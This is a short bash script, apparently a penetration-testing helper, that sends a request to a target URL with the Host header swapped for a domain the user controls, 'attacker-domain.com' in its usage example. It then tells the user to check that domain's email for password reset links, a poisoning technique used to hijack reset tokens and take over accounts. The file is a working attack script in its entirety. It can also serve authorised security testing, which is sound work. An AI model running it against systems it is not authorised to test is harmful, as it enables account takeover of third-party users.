#!/bin/bash
# Test Host Header Injection
# Usage: ./test-host-header.sh <target-url> <controlled-domain>

if [ $# -lt 2 ]; then
    echo "Usage: $0 <target-url> <controlled-domain>"
    echo "Example: $0 https://example.com/reset-password attacker-domain.com"
    exit 1
fi

TARGET_URL="$1"
CONTROLLED_DOMAIN="$2"

echo "Testing Host Header Injection..."
echo "Target: $TARGET_URL"
echo "Controlled Domain: $CONTROLLED_DOMAIN"
echo ""

# Test with modified Host header
echo "Sending request with modified Host header..."
curl -v -H "Host: $CONTROLLED_DOMAIN" "$TARGET_URL" 2>&1 | tee host-header-test.log

echo ""
echo "Check your email at $CONTROLLED_DOMAIN for any password reset links"
echo "Results saved to: host-header-test.log"
